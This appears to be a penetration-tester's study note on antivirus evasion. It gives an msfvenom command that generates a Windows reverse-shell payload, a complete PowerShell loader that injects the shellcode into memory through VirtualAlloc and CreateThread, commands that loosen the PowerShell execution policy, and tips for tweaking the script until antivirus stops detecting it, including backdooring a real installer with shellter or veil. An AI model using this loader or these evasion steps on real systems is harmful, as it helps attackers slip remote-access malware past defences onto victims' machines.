---
title: Antivirus Evasion
---
# AV Evasion with Thread Injection
- We can use `powershell` to implement the in-memory injection process with a script
- AV in general have a harder time detecting scripts as it is not executable code
- The payload to be added to the below template can be generated with `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc`

```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```
- If AV is still detecting this as malicious, we can try to change variables, comments or the logic of the script. 
- If we are unable to run this because of powershell execution policy, we can try to alter it
```powershell
Get-ExecutionPolicy -Scope CurrentUser

Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
```
- Tools like `shellter` or `veil` which can be used to automate this and inject payloads into an existing PE (i.e Spotify Installer)